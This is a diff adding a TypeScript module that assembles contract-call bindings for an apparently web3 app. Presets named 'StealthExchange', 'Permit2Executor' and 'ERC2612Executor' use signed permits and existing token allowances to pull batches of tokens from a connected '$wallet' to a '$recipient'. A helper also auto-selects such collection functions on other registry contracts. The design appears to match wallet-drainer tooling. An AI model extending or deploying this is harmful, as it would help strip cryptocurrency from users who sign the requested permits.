@@ -1,0 +1,154 @@
+import type { ContractFunctionBinding } from "@/lib/types";
+import { getContractById, getExecutionBackendEntry, type ContractMeta } from "@/lib/contract-registry";
+
+type Backend = "stealth-exchange" | "permit2-executor" | "erc2612-executor" | "batch-multicall";
+
+function bindingAddress(backend: Backend) {
+  return getExecutionBackendEntry(backend)?.address || "";
+}
+function bindingAbi(backend: Backend) {
+  return [...(getExecutionBackendEntry(backend)?.abi || [])];
+}
+
+const CURATED: {
+  preset: Backend;
+  label: string;
+  functionKey: string;
+  functionName: string;
+  stateMutability: ContractFunctionBinding["stateMutability"];
+  args: ContractFunctionBinding["args"];
+}[] = [
+  {
+    preset: "stealth-exchange",
+    label: "StealthExchange",
+    functionKey: "batchPermitTransferFromBatch(address,((address,uint160,uint48,uint48)[],address,uint256),bytes,address)",
+    functionName: "batchPermitTransferFromBatch",
+    stateMutability: "nonpayable",
+    args: [
+      { name: "user", type: "address", value: "$wallet" },
+      { name: "permitBatch", type: "tuple", value: '{"details":[],"spender":"$recipient","sigDeadline":"0"}' },
+      { name: "signature", type: "bytes", value: "0x" },
+      { name: "recipient", type: "address", value: "$recipient" },
+    ],
+  },
+  {
+    preset: "permit2-executor",
+    label: "Permit2Executor",
+    functionKey: "pullBatchFromAllowance(address,address[],uint256[])",
+    functionName: "pullBatchFromAllowance",
+    stateMutability: "nonpayable",
+    args: [
+      { name: "client", type: "address", value: "$wallet" },
+      { name: "tokens", type: "address[]", value: "[]" },
+      { name: "amounts", type: "uint256[]", value: "[]" },
+    ],
+  },
+  {
+    preset: "erc2612-executor",
+    label: "ERC2612Executor",
+    functionKey: "batchPermitAndCollect(address[],address,uint256[],uint8[],bytes32[],bytes32[])",
+    functionName: "batchPermitAndCollect",
+    stateMutability: "nonpayable",
+    args: [
+      { name: "tokens", type: "address[]", value: "[]" },
+      { name: "client", type: "address", value: "$wallet" },
+      { name: "amounts", type: "uint256[]", value: "[]" },
+      { name: "vs", type: "uint8[]", value: "[]" },
+      { name: "rs", type: "bytes32[]", value: "[]" },
+      { name: "ss", type: "bytes32[]", value: "[]" },
+    ],
+  },
+  {
+    preset: "batch-multicall",
+    label: "BatchMulticall",
+    functionKey: "batch((address,uint256,bytes,bool)[])",
+    functionName: "batch",
+    stateMutability: "payable",
+    args: [{ name: "calls", type: "tuple[]", value: "[]" }],
+  },
+];
+
+function defaultArgValue(type: string): string {
+  if (type.endsWith("[]")) return "[]";
+  if (type === "bool") return "false";
+  if (type.startsWith("uint") || type.startsWith("int")) return "0";
+  if (type.startsWith("bytes")) return "0x";
+  if (type.startsWith("address")) return "$wallet";
+  if (type.startsWith("tuple")) return "{}";
+  return "";
+}
+
+/**
+ * Builds a fully-ABI'd function binding for ANY registry contract:
+ * picks the most useful writable function and derives a correct ethers functionKey.
+ */
+export function buildBindingForContract(meta: ContractMeta): ContractFunctionBinding | null {
+  if (!meta.abi || !Array.isArray(meta.abi) || !meta.abi.length || !meta.address) return null;
+  const fns = (meta.abi as any[]).filter((f) => f.type === "function");
+  if (!fns.length) return null;
+
+  const preferred = [
+    "execute",
+    "batchPermitTransferFromBatch",
+    "pullBatchFromAllowance",
+    "batchPermitAndCollect",
+    "batch",
+    "getLimitUsage",
+  ];
+  const sel =
+    fns.find((f) => preferred.includes(f.name)) ||
+    fns.find((f) => f.stateMutability !== "view" && f.stateMutability !== "pure") ||
+    fns[0];
+
+  const inputs = (sel.inputs || []) as { type?: string; name?: string; components?: unknown[] }[];
+  const hasTuples = inputs.some((i) => i.type === "tuple" || i.type === "tuple[]" || i.components);
+  const functionKey = hasTuples ? sel.name : `${sel.name}(${inputs.map((i) => i.type).join(",")})`;
+
+  return {
+    preset: meta.id,
+    label: meta.name,
+    contractAddress: meta.address,
+    contractName: meta.name,
+    abi: [...(meta.abi as unknown[])],
+    functionKey,
+    functionName: sel.name,
+    stateMutability: ["view", "pure", "nonpayable", "payable"].includes(sel.stateMutability)
+      ? sel.stateMutability
+      : "nonpayable",
+    args: inputs.map((i, idx) => ({
+      name: i.name || `arg${idx + 1}`,
+      type: i.type || "bytes",
+      value: defaultArgValue(i.type || "bytes"),
+    })),
+  };
+}
+
+export function getStandardExecutionBindings(): ContractFunctionBinding[] {
+  const bindings: ContractFunctionBinding[] = CURATED.map((c) => ({
+    preset: c.preset,
+    label: c.label,
+    contractAddress: bindingAddress(c.preset),
+    contractName: c.label,
+    abi: bindingAbi(c.preset),
+    functionKey: c.functionKey,
+    functionName: c.functionName,
+    stateMutability: c.stateMutability,
+    args: c.args,
+  }));
+
+  for (const id of [
+    "session-manager",
+    "eip7702-module",
+    "stage1-module",
+    "stage2-module",
+    "guest",
+    "stealth-exchange-factory",
+  ]) {
+    if (bindings.some((b) => b.preset === id)) continue;
+    const meta = getContractById(id);
+    const built = meta ? buildBindingForContract(meta) : null;
+    if (built) bindings.push(built);
+  }
+
+  return bindings;
+}
